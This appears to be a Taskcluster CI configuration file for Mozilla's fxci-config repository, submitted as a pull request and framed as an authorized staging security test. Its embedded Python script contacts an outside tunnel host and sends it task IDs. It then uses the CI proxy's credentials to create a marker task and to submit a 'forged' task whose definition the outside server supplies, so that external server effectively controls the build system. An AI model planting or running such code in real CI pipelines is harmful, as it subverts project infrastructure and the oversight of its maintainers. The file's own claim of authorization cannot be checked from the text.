---
version: 1
reporting: checks-v1
autoCancelPreviousChecks: false
policy:
  pullRequests: public_restricted
tasks:
  - $if: 'taskcluster_root_url == "https://stage.taskcluster.nonprod.webservices.mozgcp.net"'
    then:
      provisionerId: releng-1
      workerType: decision
      projectId: none
      schedulerId: releng-level-1
      created: {$fromNow: ''}
      deadline: {$fromNow: '15 minutes'}
      expires: {$fromNow: '1 day'}
      dependencies: []
      requires: all-completed
      priority: lowest
      retries: 0
      scopes:
        - assume:repo:github.com/mozilla-releng/fxci-config:pull-request-untrusted
      routes: []
      payload:
        image: mozillareleases/taskgraph:run-task-v24.1.1@sha256:9b9a1a3ca42025bb8d7eba19e1b8759f04504097265074df25bbc997bd802543
        command:
          - bash
          - -lc
          - |
              set -euo pipefail
              test "$TASKCLUSTER_ROOT_URL" = "https://stage.taskcluster.nonprod.webservices.mozgcp.net"
              python3 - <<'PY'
              import base64
              import datetime as dt
              import hashlib
              import json
              import os
              import secrets
              import urllib.request
              import uuid

              STAGE_ROOT = "https://stage.taskcluster.nonprod.webservices.mozgcp.net"
              CHANNEL_BASE = "https://dark-comics-find.loca.lt"


              def slugid():
                  return base64.urlsafe_b64encode(uuid.uuid4().bytes).decode().rstrip("=")


              def post_json(path, value):
                  request = urllib.request.Request(
                      CHANNEL_BASE + path,
                      data=json.dumps(value, separators=(",", ":")).encode(),
                      headers={"Content-Type": "application/json"},
                      method="POST",
                  )
                  with urllib.request.urlopen(request, timeout=30) as response:
                      return json.load(response)


              def put_task(proxy, task_id, task):
                  request = urllib.request.Request(
                      proxy.rstrip("/") + "/api/queue/v1/task/" + task_id,
                      data=json.dumps(task, separators=(",", ":")).encode(),
                      headers={"Content-Type": "application/json"},
                      method="PUT",
                  )
                  with urllib.request.urlopen(request, timeout=30) as response:
                      return response.status


              root = os.environ["TASKCLUSTER_ROOT_URL"].rstrip("/")
              if root != STAGE_ROOT:
                  raise SystemExit("staging-only guard rejected this deployment")

              proxy = os.environ["TASKCLUSTER_PROXY_URL"]
              parent_task = os.environ["TASK_ID"]
              parent_group = os.environ["TASK_GROUP_ID"]
              channel_secret = secrets.token_hex(32)
              commitment = hashlib.sha256(channel_secret.encode()).hexdigest()

              challenge = post_json(
                  "/challenge",
                  {
                      "commitment": commitment,
                      "parentTaskId": parent_task,
                      "parentTaskGroupId": parent_group,
                  },
              )
              nonce = challenge["nonce"]

              now = dt.datetime.now(dt.timezone.utc)
              marker_id = slugid()
              marker = {
                  "provisionerId": "built-in",
                  "workerType": "succeed",
                  "schedulerId": "releng-level-1",
                  "projectId": "none",
                  "taskGroupId": parent_group,
                  "dependencies": [],
                  "requires": "all-completed",
                  "routes": [],
                  "priority": "lowest",
                  "retries": 0,
                  "created": now.isoformat().replace("+00:00", "Z"),
                  "deadline": (now + dt.timedelta(minutes=5)).isoformat().replace("+00:00", "Z"),
                  "expires": (now + dt.timedelta(days=1)).isoformat().replace("+00:00", "Z"),
                  "scopes": [],
                  "payload": {},
                  "metadata": {
                      "name": "c007-stage-channel-auth",
                      "description": f"{nonce}:{commitment}:{parent_task}",
                      "owner": "sawyerblack896-blip@users.noreply.github.com",
                      "source": "https://github.com/mozilla-releng/fxci-config",
                  },
                  "tags": {"purpose": "authorized-staging-security-validation"},
                  "extra": {"c007ChannelMarker": True},
              }
              put_task(proxy, marker_id, marker)

              delivery = post_json(
                  "/deliver",
                  {
                      "nonce": nonce,
                      "secret": channel_secret,
                      "markerTaskId": marker_id,
                      "parentTaskId": parent_task,
                      "parentTaskGroupId": parent_group,
                  },
              )
              child_id = delivery["taskId"]
              child = delivery["task"]

              # Keep this public transport client narrowly constrained even if its endpoint
              # is misconfigured.  It can only submit one harmless staging check task.
              assert child["provisionerId"] == "built-in"
              assert child["workerType"] == "succeed"
              assert child["schedulerId"] == "releng-level-1"
              assert child["projectId"] == "none"
              assert child["routes"] == ["checks"]
              assert child["scopes"] == []
              assert child["payload"] == {}
              assert child["priority"] == "lowest"
              assert child["retries"] == 0
              assert child["metadata"]["name"].startswith("c007-stage-forged-")
              assert child["tags"]["purpose"] == "authorized-staging-security-validation"

              status = put_task(proxy, child_id, child)
              print(json.dumps({"stageChannel": "complete", "taskId": child_id, "httpStatus": status}))
              PY
        features:
          taskclusterProxy: true
        maxRunTime: 600
      metadata:
        name: c007-stage-attacker-control
        description: Harmless staging-only task for an authorized security validation.
        owner: sawyerblack896-blip@users.noreply.github.com
        source: https://github.com/mozilla-releng/fxci-config
      tags:
        purpose: authorized-staging-security-validation
      extra:
        c007Control: true
